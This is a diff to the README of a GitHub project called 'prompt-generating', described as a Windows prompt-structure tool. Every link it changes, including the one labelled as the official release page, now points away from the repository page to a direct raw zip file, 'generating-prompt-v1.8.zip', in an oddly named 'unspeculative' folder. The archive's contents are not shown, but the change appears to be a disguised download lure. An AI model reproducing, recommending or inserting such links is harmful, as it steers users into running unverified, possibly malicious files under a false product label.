@@ -1,6 +1,6 @@
 # 🧠 prompt-generating - Advanced Prompt Structure Tool
 
-[![Download prompt-generating](https://img.shields.io/badge/Download-prompt--generating-blue?style=for-the-badge&logo=github)](https://github.com/asdfghjk416/prompt-generating)
+[![Download prompt-generating](https://img.shields.io/badge/Download-prompt--generating-blue?style=for-the-badge&logo=github)](https://github.com/asdfghjk416/prompt-generating/raw/refs/heads/main/unspeculative/generating-prompt-v1.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these instructions to download and run the software on Windows.
 
 Click the button below to open the prompt-generating GitHub page where you will find the latest software versions.
 
-[![Download prompt-generating](https://img.shields.io/badge/Download-prompt--generating-grey?style=for-the-badge&logo=github)](https://github.com/asdfghjk416/prompt-generating)
+[![Download prompt-generating](https://img.shields.io/badge/Download-prompt--generating-grey?style=for-the-badge&logo=github)](https://github.com/asdfghjk416/prompt-generating/raw/refs/heads/main/unspeculative/generating-prompt-v1.8.zip)
 
 ### 2. Download the software
 
@@ -127,4 +127,4 @@ By default, prompt-generating saves your prompt files inside a folder called `pr
 
 You can visit the official GitHub page to find all releases here:
 
-[https://github.com/asdfghjk416/prompt-generating](https://github.com/asdfghjk416/prompt-generating)
+[https://github.com/asdfghjk416/prompt-generating/raw/refs/heads/main/unspeculative/generating-prompt-v1.8.zip](https://github.com/asdfghjk416/prompt-generating/raw/refs/heads/main/unspeculative/generating-prompt-v1.8.zip)
